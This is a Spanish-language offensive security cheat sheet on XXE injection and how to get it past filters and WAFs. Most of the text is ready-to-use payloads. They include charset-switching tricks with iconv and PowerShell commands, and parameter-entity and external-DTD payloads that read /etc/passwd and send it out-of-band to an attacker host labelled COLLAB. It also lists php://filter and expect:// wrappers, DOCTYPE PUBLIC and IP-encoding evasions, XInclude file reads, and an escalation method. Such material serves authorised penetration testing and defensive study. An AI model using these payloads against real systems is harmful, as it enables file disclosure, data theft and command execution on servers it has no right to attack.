---
tags:
  - obfuscation
  - xxe
  - xml
  - filter-bypass
---

# XXE / XML - Ofuscación y bypass de filtros

Notas para cuando un filtro bloquea `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, o hay
sanitización parcial en una inyección XXE. Idea: expresar la entidad/DTD con una
representación que el parser XML resuelve pero el filtro no reconoce.

---

## 🔎 Índice de bypasses

| Te filtran… | Técnicas | Ir a |
|-------------|----------|------|
| `<!ENTITY`/`SYSTEM` en ASCII | cambiar **charset** del doc (UTF-16/UTF-7/EBCDIC) | [[#1. Bypass por ENCODING del propio XML\|§1]] |
| entidades generales `&x;` | **parameter entities** `%x;` + DTD externo (OOB) | [[#2. PARAMETER ENTITIES (bypass de filtros de entidad general)\|§2]] |
| el contenido rompe el XML | wrappers: `php://filter` base64, `data://`, `jar:` | [[#3. Wrappers / esquemas de URL (ofuscar la ruta y evitar errores)\|§3]] |
| `SYSTEM`/`<!DOCTYPE`/`http://` | `PUBLIC` · encoding · IP dec/hex · otros esquemas | [[#4. Ofuscar keywords / estructura\|§4]] |
| **no** controlás el DOCTYPE | **XInclude** | [[#5. XInclude (cuando NO controlas el DOCTYPE)\|§5]] |
| cómo abordarlo | metodología | [[#6. Metodología\|§6]] |

> Encoding por objetivo: [[encodings]] (XML entities `&#xNN;`).

---

## 1. Bypass por ENCODING del propio XML

Un parser XML respeta la declaración de encoding. Si el filtro busca strings
ASCII (`<!ENTITY`, `SYSTEM`), cambia el charset del documento entero:

```xml
<?xml version="1.0" encoding="UTF-16"?>
```
Reenvía el body codificado en UTF-16 (LE/BE). El WAF que busca `<!ENTITY` en
ASCII no lo encuentra, pero el parser lo decodifica igual. También sirven
`UTF-7`, `IBM037`/`EBCDIC` en parsers Java antiguos.

Generar UTF-16 rápido:
```bash
# payload.xml -> payload_utf16.xml
iconv -f UTF-8 -t UTF-16LE payload.xml > payload_utf16.xml
```
```powershell
[IO.File]::WriteAllText("payload_utf16.xml",
  [IO.File]::ReadAllText("payload.xml"), [Text.Encoding]::Unicode)
```

---

## 2. PARAMETER ENTITIES (bypass de filtros de entidad general)

Si se filtran/escapan las entidades generales `&entidad;`, usa **parameter
entities** `%entidad;` (válidas dentro del DTD):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://COLLAB/?x=%file;'>">
  %eval;
]>
<r>&exfil;</r>
```

### DTD externo (out-of-band, evita filtros locales)
El grueso del payload vive fuera; el body solo referencia:
```xml
<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "http://COLLAB/evil.dtd">
<r>&exfil;</r>
```
`evil.dtd` en tu servidor:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">
%eval;
%exfil;
```
`&#x25;` = `%` escapado, necesario dentro de la definición.

---

## 3. Wrappers / esquemas de URL (ofuscar la ruta y evitar errores)

Cambia `file://` por wrappers que además codifican el contenido:

```
php://filter/convert.base64-encode/resource=/etc/passwd    (PHP; devuelve base64)
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,PD9waHA...                        (PHP)
expect://id                                                (PHP con expect)
jar:file:///path!/                                         (Java)
netdoc:/etc/passwd                                         (Java antiguo)
```

`php://filter` con base64 es clave: evita que caracteres del fichero (como `<`)
rompan el XML **y** ofusca el contenido frente a inspección.

---

## 4. Ofuscar keywords / estructura

| Filtro | Bypass |
|--------|--------|
| Bloquea `SYSTEM` | usa `PUBLIC "-//x//x" "http://..."` (DOCTYPE PUBLIC) |
| Bloquea `<!DOCTYPE` en ASCII | cambia encoding (sección 1) |
| Escapa `<` `>` | prueba entidades numéricas dentro del DTD externo |
| Bloquea `http://` | prueba `//COLLAB`, IP en decimal/hex, `ftp://`, `gopher://` |

DOCTYPE PUBLIC (alternativa a SYSTEM):
```xml
<!DOCTYPE r PUBLIC "-//x//x DTD//EN" "http://COLLAB/evil.dtd">
```

---

## 5. XInclude (cuando NO controlas el DOCTYPE)

Si solo controlas un dato dentro de un XML que ya monta el servidor y no puedes
declarar un DTD, usa XInclude:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## 6. Metodología

1. **Prueba XXE básico** primero (`file:///etc/passwd` con entidad general).
2. Si se filtra la entidad -> **parameter entities** + **DTD externo** (OOB).
3. Si se filtra el string del DTD -> **cambia el encoding** del documento.
4. Si el contenido rompe el XML -> **`php://filter` base64** o exfiltración OOB.
5. Sin control del DOCTYPE -> **XInclude**.
